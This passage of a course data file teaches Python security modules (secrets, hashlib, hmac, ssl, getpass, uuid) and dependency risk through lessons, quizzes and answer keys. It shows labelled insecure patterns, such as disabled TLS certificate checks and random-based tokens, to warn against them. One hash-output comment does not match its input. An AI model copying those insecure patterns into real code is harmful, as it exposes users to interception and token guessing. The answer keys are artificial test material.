            "## The `secrets` Module\n\nThe `secrets` module (Python 3.6+) provides cryptographically secure random generation backed by the OS CSPRNG (e.g., `/dev/urandom`).\n\nKey functions:\n- `secrets.token_bytes(n)` — n random bytes\n- `secrets.token_hex(n)` — 2n-character hex string\n- `secrets.token_urlsafe(n)` — URL-safe base64, ~1.33n characters\n- `secrets.randbelow(n)` — secure integer in [0, n)\n- `secrets.choice(seq)` — secure random element",
        },
        {
          kind: "comparison",
          leftLabel: "random (NOT for security)",
          rightLabel: "secrets (for security)",
          leftCode: `import random
# Predictable if seed is known:
token = random.randint(0, 10**6)
password = ''.join(
    random.choices('abcdef', k=10)
)`,
          rightCode: `import secrets
# Cryptographically secure:
token = secrets.token_urlsafe(32)
password = ''.join(
    secrets.choice('abcdef')
    for _ in range(10)
)`,
          caption: "Use secrets for passwords, tokens, nonces — never random",
        },
        {
          kind: "code",
          language: "python",
          code: `import secrets

# API key (URL-safe, 32 bytes of entropy → 43 chars)
api_key = secrets.token_urlsafe(32)
print(f"API key: {api_key}")

# Password reset token
reset_token = secrets.token_hex(16)
print(f"Reset: {reset_token}")

# Secure random integer (e.g., TOTP-style)
otp = secrets.randbelow(1_000_000)
print(f"OTP: {otp:06d}")`,
          caption: "Generating secure tokens for API keys, reset links, and OTPs",
        },
        {
          kind: "why-matters",
          body: "Using random.random() or random.randint() for security tokens allows attackers to predict future tokens if they observe enough output. The secrets module uses OS-level CSPRNG that is specifically designed to be unpredictable.",
        },
      ],
      interactions: [
        {
          id: "s38-secrets-mc",
          kind: "multiple-choice",
          prompt: "Which function generates a URL-safe random token suitable for use as a password-reset link?",
          beginnerPurpose: "Know the right secrets function for URL-safe tokens",
          expectedConceptIds: ["cryptography"],
          options: [
            { id: "a", text: "random.randint(0, 10**32)", isCorrect: false, explanation: "random is not cryptographically secure and integers are not URL-safe." },
            { id: "b", text: "secrets.token_urlsafe(32)", isCorrect: true, explanation: "Correct! token_urlsafe produces URL-safe base64 with 32 bytes of secure entropy." },
            { id: "c", text: "uuid.uuid4().hex", isCorrect: false, explanation: "UUID4 is random but not specifically from a CSPRNG API and is less entropy than token_urlsafe(32)." },
            { id: "d", text: "hashlib.sha256(b'seed').hexdigest()", isCorrect: false, explanation: "A fixed seed hash is deterministic and easily predictable." },
          ],
          allowMultiple: false,
          allowedAttempts: 2,
          hints: [{ level: "syntax", text: "Look for the combination: secrets module + url-safe output." }],
          feedback: {
            correct: "Correct! secrets.token_urlsafe(32) generates a CSPRNG-backed URL-safe token.",
            incorrect: "Use secrets.token_urlsafe(n) for URL-safe tokens like password reset links.",
          },
        },
        {
          id: "s38-secrets-fill",
          kind: "fill-code",
          prompt: "Generate a 16-byte hex token for a session ID.",
          beginnerPurpose: "Practice generating secure hex tokens",
          expectedConceptIds: ["cryptography"],
          codeTemplate: `import secrets
session_id = secrets.___(16)
print(len(session_id))  # 32 (hex chars for 16 bytes)`,
          blanks: [
            { placeholder: "___", answer: "token_hex", caseSensitive: true },
          ],
          allowedAttempts: 3,
          hints: [{ level: "syntax", text: "token_hex(n) returns a hex string of 2n characters." }],
          feedback: {
            correct: "Correct! secrets.token_hex(16) generates 16 random bytes as 32 hex characters.",
            incorrect: "secrets.token_hex(n) generates n random bytes encoded as 2n hex characters.",
          },
        },
      ],
      reviewHooks: [
        { conceptId: "cryptography", recallPrompt: "Why must you use secrets instead of random for security tokens?", nextReviewAfterDays: 3 },
      ],
      masteryCriteria: {
        requiredInteractionIds: ["s38-secrets-mc", "s38-secrets-fill"],
        minimumCorrectFraction: 0.8,
        reviewHookIds: [],
      },
    },

    // ── 38.9 hashlib ──────────────────────────────────────────────────────
    {
      id: "s38-hashlib",
      stageId: "stage-38",
      title: "hashlib — Cryptographic Hashing",
      kind: "concept",
      difficulty: "advanced",
      objectives: [
        "Hash data with hashlib.sha256 and retrieve hex and binary digests",
        "Hash large files in chunks without loading everything into memory",
        "Explain why MD5/SHA-1 are not suitable for security applications",
      ],
      prerequisites: ["s38-secrets-module"],
      concepts: ["cryptography"],
      contentBlocks: [
        {
          kind: "text",
          markdown:
            "## `hashlib` — Cryptographic Hashing\n\nhashlib provides cryptographic hash functions. Use them for:\n- **Password hashing** (use specialized PBKDF2/bcrypt/argon2, not raw SHA)\n- **File integrity** verification (SHA-256)\n- **Message authentication** (HMAC, covered next)\n\n**Avoid** MD5 and SHA-1 for security — they have known collision vulnerabilities.\n\n```python\nimport hashlib\nh = hashlib.sha256(b\"data\")\nprint(h.hexdigest())  # 64-char hex string\nprint(h.digest())     # 32 raw bytes\n```",
        },
        {
          kind: "code",
          language: "python",
          code: `import hashlib

# Hash a string
text = b"hello, world"
print(hashlib.sha256(text).hexdigest())
# b94d27b9934d3e08a52e52d7da7dabfac484efe04294e576...

# Hash a large file in chunks (memory-efficient)
def hash_file(path: str, algo: str = "sha256") -> str:
    h = hashlib.new(algo)
    with open(path, "rb") as f:
        while chunk := f.read(65536):
            h.update(chunk)
    return h.hexdigest()

# Available algorithms
print(hashlib.algorithms_available)  # {'sha256', 'sha512', 'blake2b', ...}`,
          caption: "SHA-256 for single values; chunked update() for large files",
        },
        {
          kind: "callout",
          variant: "warning",
          title: "Never store passwords as plain SHA-256 hashes",
          body: "Raw SHA-256 of a password is vulnerable to rainbow table attacks. Use `hashlib.pbkdf2_hmac`, or better, `bcrypt` / `argon2-cffi` which add salting and computational cost.",
        },
        {
          kind: "why-matters",
          body: "hashlib is the foundation of Python's cryptographic tooling. Understanding it helps you build secure file verification, content-addressed storage, and HMAC authentication.",
        },
      ],
      interactions: [
        {
          id: "s38-hashlib-mc",
          kind: "multiple-choice",
          prompt: "For verifying a downloaded software package's integrity, which hash algorithm should you use?",
          beginnerPurpose: "Choose an appropriate hash algorithm for integrity checking",
          expectedConceptIds: ["cryptography"],
          options: [
            { id: "a", text: "MD5", isCorrect: false, explanation: "MD5 has known collisions — attackers can craft malicious files with the same MD5." },
            { id: "b", text: "SHA-1", isCorrect: false, explanation: "SHA-1 is broken; collisions have been demonstrated (SHAttered attack)." },
            { id: "c", text: "SHA-256", isCorrect: true, explanation: "Correct! SHA-256 is the current standard for file integrity verification." },
            { id: "d", text: "CRC32", isCorrect: false, explanation: "CRC32 is not cryptographic — easily forged by attackers." },
          ],
          allowMultiple: false,
          allowedAttempts: 2,
          hints: [{ level: "concept", text: "Choose a hash without known collisions. SHA-2 family (SHA-256, SHA-512) is current standard." }],
          feedback: {
            correct: "Correct! SHA-256 is the current minimum standard for integrity verification.",
            incorrect: "Use SHA-256 or better. MD5 and SHA-1 have known weaknesses.",
          },
        },
        {
          id: "s38-hashlib-fill",
          kind: "fill-code",
          prompt: "Hash a bytes value with SHA-256 and print the hex digest.",
          beginnerPurpose: "Practice basic hashlib usage",
          expectedConceptIds: ["cryptography"],
          codeTemplate: `import hashlib
data = b"important data"
digest = hashlib.___(___ ).___()
print(digest)`,
          blanks: [
            { placeholder: "___", answer: "sha256", caseSensitive: true },
            { placeholder: "___", answer: "data", caseSensitive: true },
            { placeholder: "___", answer: "hexdigest", caseSensitive: true },
          ],
          allowedAttempts: 3,
          hints: [{ level: "syntax", text: "hashlib.sha256(data).hexdigest() returns a hex string." }],
          feedback: {
            correct: "Correct! hashlib.sha256(data).hexdigest() is the standard pattern.",
            incorrect: "hashlib.sha256(data).hexdigest() — sha256 function, pass data, call hexdigest().",
          },
        },
      ],
      reviewHooks: [
        { conceptId: "cryptography", recallPrompt: "Why is raw SHA-256 insufficient for storing passwords?", nextReviewAfterDays: 4 },
      ],
      masteryCriteria: {
        requiredInteractionIds: ["s38-hashlib-mc", "s38-hashlib-fill"],
        minimumCorrectFraction: 0.8,
        reviewHookIds: [],
      },
    },

    // ── 38.10 hmac ────────────────────────────────────────────────────────
    {
      id: "s38-hmac",
      stageId: "stage-38",
      title: "hmac — Message Authentication Codes",
      kind: "concept",
      difficulty: "advanced",
      objectives: [
        "Create HMAC signatures using hmac.new",
        "Verify HMAC signatures using hmac.compare_digest to prevent timing attacks",
        "Explain the difference between a hash and an HMAC",
      ],
      prerequisites: ["s38-hashlib"],
      concepts: ["cryptography"],
      contentBlocks: [
        {
          kind: "text",
          markdown:
            "## `hmac` — Message Authentication Codes\n\nA **hash** verifies integrity (was data corrupted?). An **HMAC** verifies **both integrity and authenticity** (was this message produced by someone with the secret key?).\n\nHMAC = Hash(key + message) in a specific construction that prevents length-extension attacks.\n\n```python\nimport hmac, hashlib\n\nkey = b\"my_secret_key\"\nmessage = b\"transfer $100\"\nsig = hmac.new(key, message, hashlib.sha256).hexdigest()\n```",
        },
        {
          kind: "code",
          language: "python",
          code: `import hmac, hashlib, secrets

def sign_message(key: bytes, message: bytes) -> str:
    return hmac.new(key, message, hashlib.sha256).hexdigest()

def verify_message(key: bytes, message: bytes, signature: str) -> bool:
    expected = sign_message(key, message)
    # MUST use compare_digest — not == — to prevent timing attacks
    return hmac.compare_digest(expected, signature)

key = secrets.token_bytes(32)
msg = b"user_id=42&action=delete"

sig = sign_message(key, msg)
print(verify_message(key, msg, sig))         # True
print(verify_message(key, b"tampered", sig)) # False`,
          caption: "Sign and verify messages — always use hmac.compare_digest",
        },
        {
          kind: "callout",
          variant: "danger",
          title: "Never use == to compare HMAC signatures",
          body: "String comparison with == can leak timing information: it returns False faster when the first character differs. hmac.compare_digest() uses constant-time comparison that prevents this timing side-channel attack.",
        },
        {
          kind: "why-matters",
          body: "HMAC is used in JWT tokens, webhook signatures (Stripe, GitHub), cookie signing in Flask/Django, and API request signing (AWS SigV4). Understanding it lets you implement and verify these patterns correctly.",
        },
      ],
      interactions: [
        {
          id: "s38-hmac-mc",
          kind: "multiple-choice",
          prompt: "Why must you use hmac.compare_digest() instead of == when verifying an HMAC?",
          beginnerPurpose: "Understand timing attack prevention",
          expectedConceptIds: ["cryptography"],
          options: [
            { id: "a", text: "compare_digest is faster for long strings", isCorrect: false, explanation: "compare_digest is actually slightly slower — it always takes the same time regardless of the comparison result." },
            { id: "b", text: "compare_digest prevents timing side-channel attacks", isCorrect: true, explanation: "Correct! == short-circuits on the first mismatch; an attacker can measure response time to guess the signature byte by byte." },
            { id: "c", text: "== does not work on bytes objects", isCorrect: false, explanation: "== works fine on bytes — the issue is timing, not type compatibility." },
            { id: "d", text: "compare_digest handles Unicode automatically", isCorrect: false, explanation: "Unicode handling is not the reason — constant-time comparison is." },
          ],
          allowMultiple: false,
          allowedAttempts: 2,
          hints: [{ level: "concept", text: "Think about what information leaks when == returns False faster for some inputs." }],
          feedback: {
            correct: "Correct! compare_digest always takes the same time regardless of where the mismatch is.",
            incorrect: "== short-circuits — attackers can use response time to guess the correct signature. compare_digest is constant-time.",
          },
        },
        {
          id: "s38-hmac-fill",
          kind: "fill-code",
          prompt: "Create an HMAC-SHA256 signature for a message.",
          beginnerPurpose: "Practice creating HMAC signatures",
          expectedConceptIds: ["cryptography"],
          codeTemplate: `import hmac, hashlib
key = b"supersecretkey"
message = b"payload data"
sig = hmac.___(key, message, hashlib.sha256).hexdigest()
print(len(sig))  # 64`,
          blanks: [
            { placeholder: "___", answer: "new", caseSensitive: true },
          ],
          allowedAttempts: 3,
          hints: [{ level: "syntax", text: "hmac.new(key, message, digestmod).hexdigest()" }],
          feedback: {
            correct: "Correct! hmac.new(key, msg, hashlib.sha256).hexdigest() creates the HMAC.",
            incorrect: "hmac.new(key, message, digestmod) creates the HMAC object; call .hexdigest() for hex.",
          },
        },
      ],
      reviewHooks: [
        { conceptId: "cryptography", recallPrompt: "What is the difference between a hash and an HMAC?", nextReviewAfterDays: 4 },
      ],
      masteryCriteria: {
        requiredInteractionIds: ["s38-hmac-mc", "s38-hmac-fill"],
        minimumCorrectFraction: 0.8,
        reviewHookIds: [],
      },
    },

    // ── 38.11 ssl ─────────────────────────────────────────────────────────
    {
      id: "s38-ssl",
      stageId: "stage-38",
      title: "ssl — TLS/SSL Connections",
      kind: "concept",
      difficulty: "advanced",
      objectives: [
        "Create a default SSL context with ssl.create_default_context",
        "Explain certificate verification and why it must not be disabled",
        "Use ssl with socket for manual TLS connections",
      ],
      prerequisites: ["s38-hashlib"],
      concepts: ["cryptography"],
      contentBlocks: [
        {
          kind: "text",
          markdown:
            "## `ssl` — TLS/SSL Connections\n\nPython's `ssl` module wraps sockets with TLS. Most code uses it indirectly through `urllib`, `requests`, or `httpx`. Key concepts:\n\n- `ssl.create_default_context()` creates a context with secure defaults: certificate verification, TLS 1.2+, hostname checking\n- Never set `check_hostname=False` or `verify_mode=ssl.CERT_NONE` in production\n\n```python\nimport ssl, socket\n\nctx = ssl.create_default_context()\nwith ctx.wrap_socket(socket.socket(), server_hostname=\"example.com\") as s:\n    s.connect((\"example.com\", 443))\n```",
        },
        {
          kind: "callout",
          variant: "danger",
          title: "Disabling certificate verification breaks TLS",
          body: "ssl.CERT_NONE disables the check that proves you're talking to the real server — not a man-in-the-middle. Never use verify=False or check_hostname=False in production. If you see SSL errors, fix the certificate, don't disable verification.",
        },
        {
          kind: "comparison",
          leftLabel: "Insecure (disabled verification)",
          rightLabel: "Secure (default context)",
          leftCode: `import ssl
ctx = ssl.SSLContext()
ctx.verify_mode = ssl.CERT_NONE  # DANGEROUS
ctx.check_hostname = False        # DANGEROUS`,
          rightCode: `import ssl
# Secure defaults: verify certs, check hostname
ctx = ssl.create_default_context()
# All security features enabled automatically`,
          caption: "Always use create_default_context() for production connections",
        },
        {
          kind: "why-matters",
          body: "TLS is the foundation of all secure network communication. Understanding the ssl module helps you debug TLS errors correctly (fix the certificate, don't disable verification) and configure custom CA bundles for private CAs.",
        },
      ],
      interactions: [
        {
          id: "s38-ssl-mc",
          kind: "multiple-choice",
          prompt: "What is the most important reason NOT to set ctx.verify_mode = ssl.CERT_NONE?",
          beginnerPurpose: "Understand why certificate verification matters",
          expectedConceptIds: ["cryptography"],
          options: [
            { id: "a", text: "Performance degrades without certificate verification", isCorrect: false, explanation: "Performance is not the issue — security is." },
            { id: "b", text: "Without verification, a man-in-the-middle can intercept and read the connection", isCorrect: true, explanation: "Correct! Certificate verification proves you're connected to the intended server. Without it, anyone can intercept." },
            { id: "c", text: "Python requires CERT_REQUIRED by law", isCorrect: false, explanation: "There is no law — it's a security best practice." },
            { id: "d", text: "Certificate errors can only be fixed by disabling verification", isCorrect: false, explanation: "Certificate errors should be fixed (update the cert, add to trusted CAs) — never by disabling checks." },
          ],
          allowMultiple: false,
          allowedAttempts: 2,
          hints: [{ level: "concept", text: "What does a certificate actually prove? Who issues it?" }],
          feedback: {
            correct: "Correct! Certificates prove server identity. Without checking them, anyone can impersonate the server.",
            incorrect: "Certificates authenticate the server. Disabling verification removes this protection entirely.",
          },
        },
        {
          id: "s38-ssl-fill",
          kind: "fill-code",
          prompt: "Create a secure SSL context using the recommended function.",
          beginnerPurpose: "Practice creating a secure SSL context",
          expectedConceptIds: ["cryptography"],
          codeTemplate: `import ssl
ctx = ssl.___()
print(ctx.verify_mode)  # VerifyMode.CERT_REQUIRED`,
          blanks: [
            { placeholder: "___", answer: "create_default_context", caseSensitive: true },
          ],
          allowedAttempts: 3,
          hints: [{ level: "syntax", text: "ssl.create_default_context() returns a context with secure defaults." }],
          feedback: {
            correct: "Correct! create_default_context() sets up verification, hostname checking, and TLS 1.2+.",
            incorrect: "ssl.create_default_context() is the recommended function for all production use.",
          },
        },
      ],
      reviewHooks: [
        { conceptId: "cryptography", recallPrompt: "Why should you never use ssl.CERT_NONE in production?", nextReviewAfterDays: 4 },
      ],
      masteryCriteria: {
        requiredInteractionIds: ["s38-ssl-mc", "s38-ssl-fill"],
        minimumCorrectFraction: 0.8,
        reviewHookIds: [],
      },
    },

    // ── 38.12 getpass ─────────────────────────────────────────────────────
    {
      id: "s38-getpass",
      stageId: "stage-38",
      title: "getpass — Secure Password Input",
      kind: "concept",
      difficulty: "advanced",
      objectives: [
        "Use getpass.getpass to read passwords without echoing",
        "Explain why input() is unsuitable for passwords",
        "Use getpass.getuser to retrieve the current username",
      ],
      prerequisites: ["s38-secrets-env-vars"],
      concepts: ["security-trust-boundaries"],
      contentBlocks: [
        {
          kind: "text",
          markdown:
            "## `getpass` — Secure Password Input\n\n`getpass.getpass(prompt)` prompts for a password without echoing characters to the terminal. Use it whenever your CLI needs a password, API key, or other secret.\n\n```python\nimport getpass\n\n# Password input — no echo\npassword = getpass.getpass(\"Enter your password: \")\n\n# Current user's login name\nuser = getpass.getuser()\nprint(f\"Running as: {user}\")\n```\n\nDo not use `input()` for secrets — it displays what the user types on screen.",
        },
        {
          kind: "callout",
          variant: "tip",
          title: "getpass falls back to input() in non-terminal environments",
          body: "If stdout is not a TTY (e.g., in tests or piped scripts), getpass.getpass() may fall back to visible input. Add GetPassWarning to your test handling or set passwords via environment variables in CI.",
        },
        {
          kind: "why-matters",
          body: "Passwords visible in terminal output can be captured by screen recorders, terminal logs, and shoulder-surfers. getpass is a one-line fix that CLI tools must use whenever reading secrets interactively.",
        },
      ],
      interactions: [
        {
          id: "s38-getpass-mc",
          kind: "multiple-choice",
          prompt: "Why should you use getpass.getpass() instead of input() for passwords?",
          beginnerPurpose: "Know why getpass is required for passwords",
          expectedConceptIds: ["security-trust-boundaries"],
          options: [
            { id: "a", text: "getpass validates that the password meets complexity requirements", isCorrect: false, explanation: "getpass does not validate passwords — you must validate them yourself." },
            { id: "b", text: "getpass reads from a different file descriptor than input()", isCorrect: false, explanation: "The file descriptor difference is an implementation detail, not the primary reason." },
            { id: "c", text: "getpass does not echo the typed characters to the terminal", isCorrect: true, explanation: "Correct! getpass suppresses terminal echo so the password is not visible to onlookers or terminal logs." },
            { id: "d", text: "getpass hashes the password before returning it", isCorrect: false, explanation: "getpass returns the password as a plain string — hashing is your responsibility." },
          ],
          allowMultiple: false,
          allowedAttempts: 2,
          hints: [{ level: "concept", text: "The 'pass' in getpass refers to password — what is the key difference in how it reads input?" }],
          feedback: {
            correct: "Correct! getpass suppresses echo — typed characters don't appear on screen.",
            incorrect: "The key difference: getpass does not echo characters. input() shows what you type.",
          },
        },
        {
          id: "s38-getpass-fill",
          kind: "fill-code",
          prompt: "Prompt the user for a password without echoing it.",
          beginnerPurpose: "Practice using getpass",
          expectedConceptIds: ["security-trust-boundaries"],
          codeTemplate: `import getpass
pw = getpass.___("Database password: ")
print(f"Password length: {len(pw)}")`,
          blanks: [
            { placeholder: "___", answer: "getpass", caseSensitive: true },
          ],
          allowedAttempts: 3,
          hints: [{ level: "syntax", text: "The function and module have the same name: getpass.getpass(prompt)." }],
          feedback: {
            correct: "Correct! getpass.getpass('prompt') reads the password without showing it.",
            incorrect: "getpass.getpass('Your prompt here') reads the secret without terminal echo.",
          },
        },
      ],
      reviewHooks: [
        { conceptId: "security-trust-boundaries", recallPrompt: "What is the security difference between input() and getpass.getpass()?", nextReviewAfterDays: 5 },
      ],
      masteryCriteria: {
        requiredInteractionIds: ["s38-getpass-mc", "s38-getpass-fill"],
        minimumCorrectFraction: 0.8,
        reviewHookIds: [],
      },
    },

    // ── 38.13 uuid ────────────────────────────────────────────────────────
    {
      id: "s38-uuid",
      stageId: "stage-38",
      title: "uuid — Universally Unique Identifiers",
      kind: "concept",
      difficulty: "advanced",
      objectives: [
        "Generate UUID4 random identifiers with uuid.uuid4",
        "Explain the difference between UUID1, UUID3, UUID4, and UUID5",
        "Use UUID as a database primary key or correlation ID",
      ],
      prerequisites: ["s38-secrets-module"],
      concepts: ["cryptography"],
      contentBlocks: [
        {
          kind: "text",
          markdown:
            "## `uuid` — Universally Unique Identifiers\n\nUUIDs are 128-bit identifiers. Python's `uuid` module provides four main variants:\n\n| Version | Basis | Notes |\n|---------|-------|-------|\n| UUID1 | Timestamp + MAC | Reveals machine MAC address |\n| UUID3 | MD5 hash | Deterministic from namespace + name |\n| UUID4 | Random | Best for IDs; uses OS randomness |\n| UUID5 | SHA-1 hash | Deterministic from namespace + name |\n\nFor **security-sensitive IDs** (tokens, primary keys), always use UUID4.\n\n```python\nimport uuid\nprint(uuid.uuid4())  # e.g. 550e8400-e29b-41d4-a716-446655440000\n```",
        },
        {
          kind: "code",
          language: "python",
          code: `import uuid

# Random UUID (most common for IDs)
uid = uuid.uuid4()
print(uid)           # 550e8400-e29b-41d4-a716-...
print(uid.hex)       # 550e8400e29b41d4a716...  (no dashes)
print(str(uid))      # '550e8400-e29b-41d4-a716-...' (with dashes)
print(uid.bytes)     # 16 raw bytes

# Deterministic UUID from a name (reproducible)
namespace = uuid.NAMESPACE_URL
page_id = uuid.uuid5(namespace, "https://example.com/page/1")
print(page_id)  # always the same for the same URL`,
          caption: "UUID4 for random IDs; UUID5 for deterministic name-based IDs",
        },
        {
          kind: "callout",
          variant: "info",
          title: "UUID4 vs secrets.token_urlsafe",
          body: "Both UUID4 and secrets.token_urlsafe give you random tokens. UUID4 has a standard 8-4-4-4-12 format recognized by databases and APIs. token_urlsafe gives more entropy per character. Choose based on interoperability needs.",
        },
        {
          kind: "why-matters",
          body: "UUIDs are standard database primary keys (PostgreSQL gen_random_uuid(), Django UUIDField), distributed trace correlation IDs, and file deduplication keys. Using UUID4 instead of auto-increment integers prevents ID enumeration attacks.",
        },
      ],
      interactions: [
        {
          id: "s38-uuid-mc",
          kind: "multiple-choice",
          prompt: "Which UUID version is safest for use as a public-facing resource ID (e.g., /users/{id})?",
          beginnerPurpose: "Choose the appropriate UUID version for security",
          expectedConceptIds: ["cryptography"],
          options: [
            { id: "a", text: "UUID1 — timestamp-based", isCorrect: false, explanation: "UUID1 reveals your machine's MAC address, which is a privacy concern." },
            { id: "b", text: "UUID4 — random", isCorrect: true, explanation: "Correct! UUID4 is random and reveals no information about the machine or time." },
            { id: "c", text: "UUID3 — MD5-based", isCorrect: false, explanation: "UUID3 is deterministic from input and MD5 is cryptographically weak." },
            { id: "d", text: "Auto-increment integer", isCorrect: false, explanation: "Sequential integers allow ID enumeration (guess user/order IDs easily)." },
          ],
          allowMultiple: false,
          allowedAttempts: 2,
          hints: [{ level: "concept", text: "Which UUID version reveals no information about when or where it was created?" }],
          feedback: {
            correct: "Correct! UUID4 is random — it doesn't reveal timing or machine information.",
            incorrect: "UUID4 is the safest choice: fully random, no machine/time information disclosed.",
          },
        },
        {
          id: "s38-uuid-fill",
          kind: "fill-code",
          prompt: "Generate a UUID4 and print it as a hex string without dashes.",
          beginnerPurpose: "Practice uuid4 generation and formatting",
          expectedConceptIds: ["cryptography"],
          codeTemplate: `import uuid
uid = uuid.___()
print(uid.___)   # 32 hex chars, no dashes`,
          blanks: [
            { placeholder: "___", answer: "uuid4", caseSensitive: true },
            { placeholder: "___", answer: "hex", caseSensitive: true },
          ],
          allowedAttempts: 3,
          hints: [{ level: "syntax", text: "uuid.uuid4() creates it. The .hex attribute gives it without dashes." }],
          feedback: {
            correct: "Correct! uuid.uuid4().hex gives the 32-character hex UUID.",
            incorrect: "uuid.uuid4() creates the UUID; .hex gives the 32-char hex without dashes.",
          },
        },
      ],
      reviewHooks: [
        { conceptId: "cryptography", recallPrompt: "Why is UUID4 safer than UUID1 for public-facing IDs?", nextReviewAfterDays: 5 },
      ],
      masteryCriteria: {
        requiredInteractionIds: ["s38-uuid-mc", "s38-uuid-fill"],
        minimumCorrectFraction: 0.8,
        reviewHookIds: [],
      },
    },

    // ── 38.14 Randomness Choices ──────────────────────────────────────────
    {
      id: "s38-randomness-choices",
      stageId: "stage-38",
      title: "Cryptographic vs Non-Cryptographic Randomness",
      kind: "concept",
      difficulty: "advanced",
      objectives: [
        "Distinguish when to use secrets vs random",
        "Explain what makes a CSPRNG different from a PRNG",
        "Apply the correct randomness source for simulations, games, and security",
      ],
      prerequisites: ["s38-secrets-module"],
      concepts: ["cryptography"],
      contentBlocks: [
        {
          kind: "text",
          markdown:
            "## Cryptographic vs Non-Cryptographic Randomness\n\n| Use case | Right choice | Why |\n|----------|-------------|-----|\n| Passwords, tokens, nonces | `secrets` | Unpredictable, CSPRNG-backed |\n| Session IDs, API keys | `secrets` | Unpredictable, CSPRNG-backed |\n| Simulations, statistics | `random` | Fast, reproducible with seed |\n| Games, shuffles, sampling | `random` | Fast, good distribution |\n| Reproducible ML splits | `random` with seed | Determinism required |\n\n**Key rule**: if an adversary could benefit from predicting the value, use `secrets`.",
        },
        {
          kind: "comparison",
          leftLabel: "random (PRNG — predictable)",
          rightLabel: "secrets (CSPRNG — unpredictable)",
          leftCode: `import random
random.seed(42)
print(random.random())  # 0.6394...
# Same output every time with same seed
# An attacker who knows the seed can
# predict all future values`,
          rightCode: `import secrets
token = secrets.token_hex(16)
# Different every run
# OS entropy source — computationally
# infeasible to predict`,
          caption: "PRNG is seeded and reproducible; CSPRNG uses OS entropy",
        },
        {
          kind: "callout",
          variant: "info",
          title: "random.SystemRandom is the old way",
          body: "Before Python 3.6, you could use random.SystemRandom() for secure randomness. The secrets module is now the preferred API — cleaner and purpose-built for security use cases.",
        },
        {
          kind: "why-matters",
          body: "Using random.randint for session tokens allows session hijacking. Using secrets for simulations wastes performance. Choosing the right randomness source for each use case is a fundamental security skill.",
        },
      ],
      interactions: [
        {
          id: "s38-randomness-mc",
          kind: "multiple-choice",
          prompt: "You need to generate a random number to use as a CSRF token in a web form. Which module should you use?",
          beginnerPurpose: "Apply the correct randomness choice for security tokens",
          expectedConceptIds: ["cryptography"],
          options: [
            { id: "a", text: "random.randint(0, 10**9)", isCorrect: false, explanation: "random is a PRNG — predictable if the attacker knows the seed or observes outputs." },
            { id: "b", text: "secrets.token_urlsafe(32)", isCorrect: true, explanation: "Correct! CSRF tokens must be unpredictable — use secrets which is CSPRNG-backed." },
            { id: "c", text: "math.floor(math.pi * 10**9)", isCorrect: false, explanation: "math.pi is a constant — this is completely predictable." },
            { id: "d", text: "hash(time.time())", isCorrect: false, explanation: "time.time() is predictable to an attacker who knows roughly when the request was made." },
          ],
          allowMultiple: false,
          allowedAttempts: 2,
          hints: [{ level: "concept", text: "CSRF tokens must be unguessable. Which module provides cryptographically secure randomness?" }],
          feedback: {
            correct: "Correct! CSRF tokens need secrets — not predictable random numbers.",
            incorrect: "Security tokens require the secrets module (CSPRNG). random is predictable.",
          },
        },
        {
          id: "s38-randomness-predict",
          kind: "predict-output",
          prompt: "What is always true about this code?",
          beginnerPurpose: "Understand PRNG predictability with fixed seed",
          expectedConceptIds: ["cryptography"],
          code: `import random
random.seed(123)
a = random.randint(1, 100)
random.seed(123)
b = random.randint(1, 100)
print(a == b)`,
          expectedOutput: "True",
          allowedAttempts: 3,
          hints: [{ level: "concept", text: "Same seed → same sequence. PRNG is deterministic." }],
          feedback: {
            correct: "Correct! Same seed always produces the same sequence — PRNG is deterministic.",
            incorrect: "Resetting to the same seed replays the same sequence. a and b are identical.",
          },
        },
      ],
      reviewHooks: [
        { conceptId: "cryptography", recallPrompt: "When must you use secrets instead of random?", nextReviewAfterDays: 3 },
      ],
      masteryCriteria: {
        requiredInteractionIds: ["s38-randomness-mc", "s38-randomness-predict"],
        minimumCorrectFraction: 0.8,
        reviewHookIds: [],
      },
    },

    // ── 38.15 Dependency Risk ─────────────────────────────────────────────
    {
      id: "s38-dependency-risk",
      stageId: "stage-38",
      title: "Dependency Risk",
      kind: "concept",
      difficulty: "advanced",
      objectives: [
        "Explain how transitive dependencies increase attack surface",
        "Use pip audit or safety to check for known vulnerabilities",
        "Pin dependency versions in requirements files",
      ],
      prerequisites: ["s38-trust-boundaries"],
      concepts: ["security-trust-boundaries"],
      contentBlocks: [
        {
          kind: "text",
          markdown:
            "## Dependency Risk\n\nEvery package you install imports its code into your process. **You are responsible for the security of all your dependencies**, including transitive ones.\n\nKey risks:\n- **Known CVEs** — published vulnerabilities in packages (check with `pip audit`)\n- **Typosquatting** — `reqeusts` vs `requests` — malicious packages with similar names\n- **Abandoned packages** — no security patches for discovered vulnerabilities\n- **Transitive exposure** — your direct dep imports a vulnerable sub-dep",
        },
        {
          kind: "code",
          language: "python",
          code: `# Check for known vulnerabilities (run in terminal, not Python):
# pip install pip-audit
# pip-audit

# Or with safety:
# pip install safety
# safety check

# Pin exact versions in requirements.txt to get reproducible installs:
# requests==2.31.0
# cryptography==41.0.7

# Use pip-compile (pip-tools) to lock transitive deps:
# pip-compile requirements.in`,
          caption: "Audit and pin dependencies to manage vulnerability risk",
        },
        {
          kind: "callout",
          variant: "warning",
          title: "Never install packages from untrusted sources",
          body: "Only install packages from PyPI or your organization's private index. Avoid installing from arbitrary GitHub URLs without review. Check the package name carefully — typosquatting (similar-looking names) is a real attack vector.",
        },
        {
          kind: "why-matters",
          body: "The 2021 Log4Shell vulnerability affected millions of applications through a transitive Java dependency. Python ecosystems have had similar incidents. Dependency auditing is the minimum due diligence for production software.",
        },
      ],
      interactions: [
        {
          id: "s38-dep-risk-mc",
          kind: "multiple-choice",
          prompt: "Your app depends on library A, which depends on library B. Library B has a critical CVE. Are you affected?",
          beginnerPurpose: "Understand transitive dependency risk",
          expectedConceptIds: ["security-trust-boundaries"],
          options: [
            { id: "a", text: "No — you only depend on A, not B directly", isCorrect: false, explanation: "Transitive dependencies are installed and run in your process. Their code executes in your application." },
            { id: "b", text: "Yes — B's code runs in your process through A", isCorrect: true, explanation: "Correct! All transitive dependencies install and execute in your process." },
            { id: "c", text: "Only if library A calls the vulnerable function in B", isCorrect: false, explanation: "If B is installed and A imports it, the vulnerability may be exploitable depending on usage." },
            { id: "d", text: "Not if you have a firewall", isCorrect: false, explanation: "A firewall does not prevent vulnerabilities within your own process." },
          ],
          allowMultiple: false,
          allowedAttempts: 2,
          hints: [{ level: "concept", text: "pip install A installs A AND all of A's dependencies." }],
          feedback: {
            correct: "Correct! Transitive dependencies run in your process — their vulnerabilities affect you.",
            incorrect: "All dependencies (direct and transitive) run in your process. B's CVE affects your app.",
          },
        },
        {
